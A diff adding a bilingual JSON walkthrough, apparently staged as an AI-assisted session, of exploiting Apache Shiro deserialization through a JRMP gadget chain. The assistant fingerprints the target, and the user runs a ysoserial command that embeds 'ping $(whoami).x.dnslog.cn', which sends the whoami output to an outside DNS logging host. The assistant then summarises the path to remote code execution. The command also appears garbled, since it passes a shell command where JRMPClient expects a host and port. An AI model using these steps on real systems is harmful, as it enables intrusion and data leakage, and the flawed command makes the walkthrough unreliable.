@@ -1,0 +1,42 @@
+{
+  "_source_md": "Deser-Walkthrough/2021-06-30-JRMP-Gadget.md",
+  "version": "jrmp-gadget",
+  "title": {
+    "zh": "Shiro 框架深入利用：JRMP-Gadget 利用链",
+    "en": "Shiro Framework Advanced Exploitation: JRMP-Gadget Chain"
+  },
+  "description": {
+    "zh": "分析 Shiro 框架中 JRMP-Gadget 利用链的原理和实战利用方法。",
+    "en": "Analysis of JRMP-Gadget exploitation chain principles and practical methods in Shiro framework."
+  },
+  "steps": [
+    {
+      "type": "assistant_text",
+      "content": { "zh": "发现 Shiro 框架特征：/a/login 路由和 jeesite.session.id Cookie。", "en": "Discovered Shiro framework characteristics: /a/login route and jeesite.session.id Cookie." },
+      "annotation": { "zh": "助手响应", "en": "Assistant response" }
+    },
+    {
+      "type": "user_message",
+      "content": { "zh": "使用 ysoserial 生成 JRMP 利用链", "en": "Use ysoserial to generate JRMP exploitation chain" },
+      "codeBlocks": [
+        {
+          "language": "bash",
+          "code": "java -jar ysoserial.jar JRMPClient 'ping $(whoami).x.dnslog.cn'",
+          "caption": { "zh": "生成 JRMPClient payload", "en": "Generate JRMPClient payload" }
+        }
+      ],
+      "annotation": { "zh": "用户操作", "en": "User action" }
+    },
+    {
+      "type": "tool_result",
+      "content": { "zh": "JRMP 监听显示流量建立链接，DNSLog 收到回显。", "en": "JRMP listener shows traffic connection established, DNSLog receives callback." },
+      "toolName": "ysoserial",
+      "annotation": { "zh": "工具输出", "en": "Tool output" }
+    },
+    {
+      "type": "assistant_text",
+      "content": { "zh": "利用链：默认加密密钥 -> JRMPClient 利用链 -> Shiro 反序列化 RCE。", "en": "Exploitation chain: Default encryption key -> JRMPClient chain -> Shiro deserialization RCE." },
+      "annotation": { "zh": "助手总结", "en": "Assistant summary" }
+    }
+  ]
+}
